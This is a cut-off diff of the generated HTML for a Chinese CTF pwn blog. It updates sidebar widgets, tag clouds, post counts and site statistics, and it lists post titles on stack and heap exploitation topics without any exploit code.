+使用ida静态分析程序，main函数中调用gets()函数来获取数据，因为此函数没有数据限制，所以 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/#content-inner">2</a><span class="page-number current">3</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">主元</div><div class="author-info__description">二进制ing</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zhuyuan1213/zhuyuan1213.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">献给热爱的一切~</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段"><img src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Canary保护机制以及常用绕过手段"/></a><div class="content"><a class="title" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段">Canary保护机制以及常用绕过手段</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/" title="Chunk Extend/Overlapping | 堆拓展、重叠"><img src="https://w.wallhaven.cc/full/ex/wallhaven-exwgmr.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chunk Extend/Overlapping | 堆拓展、重叠"/></a><div class="content"><a class="title" href="/2023/07/24/Chunk%20ExtendOverlapping%20%20%E5%A0%86%E6%8B%93%E5%B1%95%E3%80%81%E9%87%8D%E5%8F%A0/" title="Chunk Extend/Overlapping | 堆拓展、重叠">Chunk Extend/Overlapping | 堆拓展、重叠</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式"><img src="https://w.wallhaven.cc/full/d6/wallhaven-d6wdl3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ELF文件格式"/></a><div class="content"><a class="title" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式">ELF文件格式</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/PWN-%E6%A0%88%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="PWN-栈保护机制"><img src="https://w.wallhaven.cc/full/zy/wallhaven-zy5omo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PWN-栈保护机制"/></a><div class="content"><a class="title" href="/2023/07/24/PWN-%E6%A0%88%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" title="PWN-栈保护机制">PWN-栈保护机制</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/ret2libc2/" title="ret2libc2"><img src="https://w.wallhaven.cc/full/n6/wallhaven-n6q1vw.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ret2libc2"/></a><div class="content"><a class="title" href="/2023/07/24/ret2libc2/" title="ret2libc2">ret2libc2</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
             <i class="fas fa-folder-open"></i>
             <span>分类</span>
             
             </div>
             <ul class="card-category-list" id="aside-cat-list">
-            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">39</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">39</span></a></li></ul></li>
-            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/Canary/" style="font-size: 1.15em; color: #999b9e">Canary</a> <a href="/tags/Chunk-Extend/" style="font-size: 1.1em; color: #999">Chunk Extend</a> <a href="/tags/Overlapping/" style="font-size: 1.1em; color: #999">Overlapping</a> <a href="/tags/PIE/" style="font-size: 1.1em; color: #999">PIE</a> <a href="/tags/challenge/" style="font-size: 1.3em; color: #99a1ac">challenge</a> <a href="/tags/ctf/" style="font-size: 1.45em; color: #99a7ba">ctf</a> <a href="/tags/heap/" style="font-size: 1.25em; color: #999fa7">heap</a> <a href="/tags/linux/" style="font-size: 1.2em; color: #999da3">linux</a> <a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/ret2csu/" style="font-size: 1.1em; color: #999">ret2csu</a> <a href="/tags/ret2libc/" style="font-size: 1.2em; color: #999da3">ret2libc</a> <a href="/tags/ret2libc1/" style="font-size: 1.1em; color: #999">ret2libc1</a> <a href="/tags/ret2libc2/" style="font-size: 1.1em; color: #999">ret2libc2</a> <a href="/tags/ret2libc3/" style="font-size: 1.1em; color: #999">ret2libc3</a> <a href="/tags/ret2syscall/" style="font-size: 1.1em; color: #999">ret2syscall</a> <a href="/tags/ret2text/" style="font-size: 1.1em; color: #999">ret2text</a> <a href="/tags/shellcode/" style="font-size: 1.15em; color: #999b9e">shellcode</a> <a href="/tags/stack/" style="font-size: 1.4em; color: #99a5b6">stack</a> <a href="/tags/stack-smash/" style="font-size: 1.1em; color: #999">stack smash</a> <a href="/tags/study/" style="font-size: 1.35em; color: #99a3b1">study</a> <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" style="font-size: 1.15em; color: #999b9e">栈迁移</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 1.1em; color: #999">格式化字符串漏洞</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">39</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">39</div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">43.6k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-07-25T02:07:04.863Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 主元</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function subtitleType () {
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/"><span class="card-category-list-name">CTF</span><span class="card-category-list-count">21</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CTF/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">21</span></a></li></ul></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/ctf/" style="font-size: 1.39em; color: rgb(134, 107, 21)">ctf</a><a href="/tags/pwn/" style="font-size: 1.45em; color: rgb(113, 72, 175)">pwn</a><a href="/tags/study/" style="font-size: 1.39em; color: rgb(44, 175, 25)">study</a><a href="/tags/stack/" style="font-size: 1.33em; color: rgb(197, 16, 57)">stack</a><a href="/tags/Canary/" style="font-size: 1.15em; color: rgb(99, 116, 182)">Canary</a><a href="/tags/heap/" style="font-size: 1.27em; color: rgb(108, 72, 89)">heap</a><a href="/tags/Chunk-Extend/" style="font-size: 1.15em; color: rgb(152, 66, 53)">Chunk Extend</a><a href="/tags/Overlapping/" style="font-size: 1.15em; color: rgb(150, 62, 190)">Overlapping</a><a href="/tags/linux/" style="font-size: 1.21em; color: rgb(11, 42, 27)">linux</a><a href="/tags/ret2libc2/" style="font-size: 1.15em; color: rgb(63, 32, 92)">ret2libc2</a><a href="/tags/ret2libc1/" style="font-size: 1.15em; color: rgb(135, 100, 183)">ret2libc1</a><a href="/tags/ret2csu/" style="font-size: 1.15em; color: rgb(86, 183, 107)">ret2csu</a><a href="/tags/ret2syscall/" style="font-size: 1.15em; color: rgb(29, 52, 130)">ret2syscall</a><a href="/tags/ret2text/" style="font-size: 1.15em; color: rgb(74, 180, 26)">ret2text</a><a href="/tags/ret2libc3/" style="font-size: 1.15em; color: rgb(91, 78, 113)">ret2libc3</a><a href="/tags/stack-smash/" style="font-size: 1.15em; color: rgb(185, 139, 127)">stack smash</a><a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" style="font-size: 1.15em; color: rgb(193, 154, 68)">栈迁移</a><a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" style="font-size: 1.15em; color: rgb(172, 7, 9)">格式化字符串漏洞</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">21</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">21</div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">36.1k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-07-25T13:30:50.460Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 主元</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function subtitleType () {
   if (true) { 
     window.typed = new Typed("#subtitle", {
       strings: ["纸上得来终觉浅 觉知此事要躬行"],
